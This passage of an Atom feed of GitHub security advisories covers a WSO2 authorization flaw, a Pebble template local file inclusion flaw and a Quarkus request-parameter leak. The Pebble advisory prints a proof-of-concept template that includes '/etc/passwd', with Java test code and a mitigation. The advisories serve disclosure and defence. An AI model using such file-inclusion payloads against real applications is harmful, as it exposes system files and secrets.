<li><a href="https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md">https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md</a></li>
<li><a href="https://github.com/advisories/GHSA-6qjp-wm6g-m32r">https://github.com/advisories/GHSA-6qjp-wm6g-m32r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6qjp-wm6g-m32r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-27T06:30:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.wso2.is:identity-server-parent] WSO2 incorrect authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6qjp-wm6g-m32r</id>
        <link href="https://github.com/advisories/GHSA-6qjp-wm6g-m32r"/>
        <updated>2025-03-03T19:50:58.000Z</updated>
        <content type="html"><![CDATA[<p>An incorrect authorization vulnerability exists in multiple WSO2 products, allowing protected APIs to be accessed directly using a refresh token instead of the expected access token. Due to improper authorization checks and token mapping, session cookies are not required for API access, potentially enabling unauthorized operations.</p>
<p>Exploitation requires an attacker to obtain a valid refresh token of an admin user. Since refresh tokens generally have a longer expiration time, this could lead to prolonged unauthorized access to API resources, impacting data confidentiality and integrity.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-2321">https://nvd.nist.gov/vuln/detail/CVE-2024-2321</a></li>
<li><a href="https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213">https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213</a></li>
<li><a href="https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md">https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md</a></li>
<li><a href="https://github.com/advisories/GHSA-6qjp-wm6g-m32r">https://github.com/advisories/GHSA-6qjp-wm6g-m32r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6qjp-wm6g-m32r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-27T06:30:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.wso2.am:am-parent] WSO2 incorrect authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6qjp-wm6g-m32r</id>
        <link href="https://github.com/advisories/GHSA-6qjp-wm6g-m32r"/>
        <updated>2025-03-03T19:50:58.000Z</updated>
        <content type="html"><![CDATA[<p>An incorrect authorization vulnerability exists in multiple WSO2 products, allowing protected APIs to be accessed directly using a refresh token instead of the expected access token. Due to improper authorization checks and token mapping, session cookies are not required for API access, potentially enabling unauthorized operations.</p>
<p>Exploitation requires an attacker to obtain a valid refresh token of an admin user. Since refresh tokens generally have a longer expiration time, this could lead to prolonged unauthorized access to API resources, impacting data confidentiality and integrity.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-2321">https://nvd.nist.gov/vuln/detail/CVE-2024-2321</a></li>
<li><a href="https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213">https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213</a></li>
<li><a href="https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md">https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md</a></li>
<li><a href="https://github.com/advisories/GHSA-6qjp-wm6g-m32r">https://github.com/advisories/GHSA-6qjp-wm6g-m32r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6qjp-wm6g-m32r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-27T06:30:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.wso2.am:am-parent] WSO2 incorrect authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6qjp-wm6g-m32r</id>
        <link href="https://github.com/advisories/GHSA-6qjp-wm6g-m32r"/>
        <updated>2025-03-03T19:50:58.000Z</updated>
        <content type="html"><![CDATA[<p>An incorrect authorization vulnerability exists in multiple WSO2 products, allowing protected APIs to be accessed directly using a refresh token instead of the expected access token. Due to improper authorization checks and token mapping, session cookies are not required for API access, potentially enabling unauthorized operations.</p>
<p>Exploitation requires an attacker to obtain a valid refresh token of an admin user. Since refresh tokens generally have a longer expiration time, this could lead to prolonged unauthorized access to API resources, impacting data confidentiality and integrity.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-2321">https://nvd.nist.gov/vuln/detail/CVE-2024-2321</a></li>
<li><a href="https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213">https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213</a></li>
<li><a href="https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md">https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md</a></li>
<li><a href="https://github.com/advisories/GHSA-6qjp-wm6g-m32r">https://github.com/advisories/GHSA-6qjp-wm6g-m32r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6qjp-wm6g-m32r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-27T06:30:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.wso2.am:am-parent] WSO2 incorrect authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6qjp-wm6g-m32r</id>
        <link href="https://github.com/advisories/GHSA-6qjp-wm6g-m32r"/>
        <updated>2025-03-03T19:50:58.000Z</updated>
        <content type="html"><![CDATA[<p>An incorrect authorization vulnerability exists in multiple WSO2 products, allowing protected APIs to be accessed directly using a refresh token instead of the expected access token. Due to improper authorization checks and token mapping, session cookies are not required for API access, potentially enabling unauthorized operations.</p>
<p>Exploitation requires an attacker to obtain a valid refresh token of an admin user. Since refresh tokens generally have a longer expiration time, this could lead to prolonged unauthorized access to API resources, impacting data confidentiality and integrity.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-2321">https://nvd.nist.gov/vuln/detail/CVE-2024-2321</a></li>
<li><a href="https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213">https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213</a></li>
<li><a href="https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md">https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md</a></li>
<li><a href="https://github.com/advisories/GHSA-6qjp-wm6g-m32r">https://github.com/advisories/GHSA-6qjp-wm6g-m32r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6qjp-wm6g-m32r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-27T06:30:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.pebbletemplates:pebble] Pebble has Arbitrary Local File Inclusion (LFI) Vulnerability via `include` macro]]></title>
        <id>https://github.com/advisories/GHSA-p75g-cxfj-7wrx</id>
        <link href="https://github.com/advisories/GHSA-p75g-cxfj-7wrx"/>
        <updated>2025-02-28T19:45:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>If untrusted user input is used to dynamically create a <code>PebbleTemplate</code> with the method <code>PebbleEngine#getLiteralTemplate</code>, then an attacker can include arbitrary local files from the file system into the generated template, leaking potentially sensitive information into the output of <code>PebbleTemplate#evaluate</code>. This is done via the <code>include</code> macro.</p>
<h3 id="details">Details</h3>
<p>The <code>include</code> macro calls <code>PebbleTempateImpl#resolveRelativePath</code> with the <code>relativePath</code> argument passed within the template:</p>
<p>Example template:</p>
<pre><code>{% include [relativePath] %}
</code></pre>
<p>When <code>resolveRelativePath</code> is called, the <code>relativePath</code>  is resolved against the <code>PebbleTemplateImpl.name</code> variable.</p>
<pre><code class="language-java">  /**
   * This method resolves the given relative path based on this template file path.
   *
   * @param relativePath the path which should be resolved.
   * @return the resolved path.
   */
  public String resolveRelativePath(String relativePath) {
    String resolved = this.engine.getLoader().resolveRelativePath(relativePath, this.name);
    if (resolved == null) {
      return relativePath;
    } else {
      return resolved;
    }
  }
</code></pre>
<p><a href="https://github.com/PebbleTemplates/pebble/blob/82ad7fcf9e9eaa45ee82ae3335a1409d19c10263/pebble/src/main/java/io/pebbletemplates/pebble/template/PebbleTemplateImpl.java#L380">https://github.com/PebbleTemplates/pebble/blob/82ad7fcf9e9eaa45ee82ae3335a1409d19c10263/pebble/src/main/java/io/pebbletemplates/pebble/template/PebbleTemplateImpl.java#L380</a></p>
<p>Unfortunately, when the template is created from a string, as is the case when <code>PebbleEngine#getLiteralTemplate</code> is used, the <code>PebbleTemplateImpl.name</code> variable is actually the entirety of the contents of the template, not a filename as the logic expects. The net result is that the <code>relativePath</code> is resolved against the system root directory. As a result, files accessible from the root directory of the filesystem can be included into a template. </p>
<h3 id="poc">PoC</h3>
<p>The following test demonstrates the vulnerability:</p>
<pre><code class="language-java">PebbleEngine e = new PebbleEngine.Builder().build();

String templateString = """
        {% include '/etc/passwd' %}
        """;
PebbleTemplate template = e.getLiteralTemplate(templateString);

try (final Writer writer = new StringWriter()) {
    template.evaluate(writer, new HashMap&lt;&gt;());
    System.out.println(writer);
}
</code></pre>
<p>As an attacker, the following malicious template demonstrates the vulnerability:</p>
<pre><code>{% include '/etc/passwd' %}
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is an arbitrary  Local File Inclusion (LFI) vulnerability. It can allow attackers to exfiltrate the contents of the local filesystem, including sensitive files into <code>PebbleTemplate</code> output. This can also be used to access the <code>/proc</code> filesystem which can give an attacker access to environment variables.</p>
<h3 id="fix">Fix</h3>
<p>There exists no published fix for this vulnerability. The best way to mitigate this vulnerability is to disable the <code>include</code> macro in Pebble Templates.</p>
<p>The following can safeguard your application from this vulnerability:</p>
<pre><code class="language-java">new PebbleEngine.Builder()
            .registerExtensionCustomizer(new DisallowExtensionCustomizerBuilder()
                    .disallowedTokenParserTags(List.of("include"))
                    .build())
            .build();
</code></pre>
<h3 id="report-timeline">Report Timeline</h3>
<p>Vulnerability was reported under the Open Source Security Foundation (OpenSSF) <a href="https://openssf.org/about/vulnerability-disclosure-policy/">Model Outbound Vulnerability Disclosure Policy: Version 0.1</a>.</p>
<ul>
<li><a href="https://github.com/PebbleTemplates/pebble/issues/680#issue-2409727829">Jul 15, 2024</a> Maintainer Contacted to enable private vulnerability reporting</li>
<li><a href="https://github.com/PebbleTemplates/pebble/issues/680#issuecomment-2236970984">Jul 18, 2024</a> I opened a GHSA 
 to report this vulnerability to the maintainer <a href="https://github.com/PebbleTemplates/pebble/security/advisories/GHSA-7c6h-hmf9-7wj7">https://github.com/PebbleTemplates/pebble/security/advisories/GHSA-7c6h-hmf9-7wj7</a> (private link)</li>
<li>Jul 29, 2024 GHSA updated to ping maintainer about vulnerability, no response</li>
<li>Oct 1, 2024 GHSA updated to ping maintainer about vulnerability, no response</li>
<li>Nov 15, 2024 GHSA updated to inform maintainer that disclosure timeline had lapsed, no response.</li>
<li>Feb 19, 2025 GHSA updated to inform maintainer that disclosure would occur imminently, no response.</li>
<li>Feb 24, 2025 this GHSA was created to disclose this vulnerability <strong>without a patch available</strong>.</li>
</ul>
<p>For further discussion, see this issue: <a href="https://github.com/PebbleTemplates/pebble/issues/688">https://github.com/PebbleTemplates/pebble/issues/688</a></p>
<h3 id="credit">Credit</h3>
<p>This vulnerability was discovered by @JLLeitschuh while at <a href="https://www.chainguard.dev">Chainguard Labs</a>. Jonathan is currently independent.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/JLLeitschuh/security-research/security/advisories/GHSA-p75g-cxfj-7wrx">https://github.com/JLLeitschuh/security-research/security/advisories/GHSA-p75g-cxfj-7wrx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1686">https://nvd.nist.gov/vuln/detail/CVE-2025-1686</a></li>
<li><a href="https://github.com/PebbleTemplates/pebble/issues/680">https://github.com/PebbleTemplates/pebble/issues/680</a></li>
<li><a href="https://github.com/PebbleTemplates/pebble/issues/688">https://github.com/PebbleTemplates/pebble/issues/688</a></li>
<li><a href="https://pebbletemplates.io/wiki/tag/include">https://pebbletemplates.io/wiki/tag/include</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-IOPEBBLETEMPLATES-8745594">https://security.snyk.io/vuln/SNYK-JAVA-IOPEBBLETEMPLATES-8745594</a></li>
<li><a href="https://github.com/advisories/GHSA-p75g-cxfj-7wrx">https://github.com/advisories/GHSA-p75g-cxfj-7wrx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p75g-cxfj-7wrx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-28T19:45:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.quarkus:quarkus-rest-deployment] Quarkus REST Endpoint Request Parameter Leakage Due to Shared Instance]]></title>
        <id>https://github.com/advisories/GHSA-phg3-gv66-q38x</id>
        <link href="https://github.com/advisories/GHSA-phg3-gv66-q38x"/>
        <updated>2025-03-03T15:32:40.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in Quarkus REST that allows request parameters to leak between concurrent requests if endpoints use field injection without a CDI scope. This vulnerability allows attackers to manipulate request data, impersonate users, or access sensitive information.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1247">https://nvd.nist.gov/vuln/detail/CVE-2025-1247</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2025-1247">https://access.redhat.com/security/cve/CVE-2025-1247</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2345172">https://bugzilla.redhat.com/show_bug.cgi?id=2345172</a></li>
<li><a href="https://github.com/quarkusio/quarkus/issues/45789">https://github.com/quarkusio/quarkus/issues/45789</a></li>
<li><a href="https://github.com/quarkusio/quarkus/commit/02ff9ed45c3928edf2a0f8b906543606fed7cd53">https://github.com/quarkusio/quarkus/commit/02ff9ed45c3928edf2a0f8b906543606fed7cd53</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2025:1885">https://access.redhat.com/errata/RHSA-2025:1885</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2025:1884">https://access.redhat.com/errata/RHSA-2025:1884</a></li>
<li><a href="https://github.com/quarkusio/quarkus/commit/d8df15cec17dc5d085efc372d77cbef1341ae071">https://github.com/quarkusio/quarkus/commit/d8df15cec17dc5d085efc372d77cbef1341ae071</a></li>
<li><a href="https://github.com/quarkusio/quarkus/commit/f42166ee7041ed09b7183d5dbf3ece2439b16676">https://github.com/quarkusio/quarkus/commit/f42166ee7041ed09b7183d5dbf3ece2439b16676</a></li>
<li><a href="https://quarkus.io/blog/cve-fixes-feb-2025">https://quarkus.io/blog/cve-fixes-feb-2025</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2025:2067">https://access.redhat.com/errata/RHSA-2025:2067</a></li>
<li><a href="https://github.com/advisories/GHSA-phg3-gv66-q38x">https://github.com/advisories/GHSA-phg3-gv66-q38x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-phg3-gv66-q38x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-13T15:31:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.quarkus:quarkus-rest] Quarkus REST Endpoint Request Parameter Leakage Due to Shared Instance]]></title>
        <id>https://github.com/advisories/GHSA-phg3-gv66-q38x</id>
        <link href="https://github.com/advisories/GHSA-phg3-gv66-q38x"/>
        <updated>2025-03-03T15:32:40.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in Quarkus REST that allows request parameters to leak between concurrent requests if endpoints use field injection without a CDI scope. This vulnerability allows attackers to manipulate request data, impersonate users, or access sensitive information.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1247">https://nvd.nist.gov/vuln/detail/CVE-2025-1247</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2025-1247">https://access.redhat.com/security/cve/CVE-2025-1247</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2345172">https://bugzilla.redhat.com/show_bug.cgi?id=2345172</a></li>
<li><a href="https://github.com/quarkusio/quarkus/issues/45789">https://github.com/quarkusio/quarkus/issues/45789</a></li>
<li><a href="https://github.com/quarkusio/quarkus/commit/02ff9ed45c3928edf2a0f8b906543606fed7cd53">https://github.com/quarkusio/quarkus/commit/02ff9ed45c3928edf2a0f8b906543606fed7cd53</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2025:1885">https://access.redhat.com/errata/RHSA-2025:1885</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2025:1884">https://access.redhat.com/errata/RHSA-2025:1884</a></li>
<li><a href="https://github.com/quarkusio/quarkus/commit/d8df15cec17dc5d085efc372d77cbef1341ae071">https://github.com/quarkusio/quarkus/commit/d8df15cec17dc5d085efc372d77cbef1341ae071</a></li>
<li><a href="https://github.com/quarkusio/quarkus/commit/f42166ee7041ed09b7183d5dbf3ece2439b16676">https://github.com/quarkusio/quarkus/commit/f42166ee7041ed09b7183d5dbf3ece2439b16676</a></li>
<li><a href="https://quarkus.io/blog/cve-fixes-feb-2025">https://quarkus.io/blog/cve-fixes-feb-2025</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2025:2067">https://access.redhat.com/errata/RHSA-2025:2067</a></li>
<li><a href="https://github.com/advisories/GHSA-phg3-gv66-q38x">https://github.com/advisories/GHSA-phg3-gv66-q38x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-phg3-gv66-q38x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-13T15:31:25.000Z</published>
    </entry>
</feed>